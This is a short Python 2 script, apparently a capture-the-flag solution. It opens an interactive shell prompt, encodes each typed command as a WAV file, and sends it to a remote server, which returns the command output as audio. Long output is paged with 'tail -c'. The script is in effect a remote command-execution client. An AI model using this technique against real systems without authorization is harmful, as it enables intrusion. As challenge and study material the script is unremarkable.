#!/usr/bin/env python

from sice4 import encode_wav
from sice2 import decode_wav

import socket
import readline # nice handling of escape sequences :)
import sys,os
sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0) # unbuffer.

def recvall(sock):
    buf = b''
    while True:
        data = sock.recv(1024)
        if data:
            buf += data
        else:
            break
    return buf

def remote_exec(cmd):
    encode_wav(cmd,'temp.wav')
    wav = None
    with open('temp.wav', 'rb') as f:
        wav = f.read()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('r2dbag.420blaze.in', 420))
    s.sendall(wav)
    s.shutdown(socket.SHUT_WR)
    wav = recvall(s)
    if not wav or wav[0:4] != 'RIFF' or len(wav)==0x2d:
        return
    with open('temp.wav', 'wb') as f:
        f.write(wav)
    decoded = decode_wav('temp.wav')
    return decoded

def full_exec(cmd,idx=0):
    decoded = remote_exec('%s|tail -c +%d' % (cmd, idx))
    if decoded and decoded[-6:]=='<snip>':
        decoded = decoded[0:-6] + full_exec(cmd, idx+len(decoded)-6)
    return decoded

try:
    while True:
        print full_exec(raw_input('$ '))

except KeyboardInterrupt:
    pass
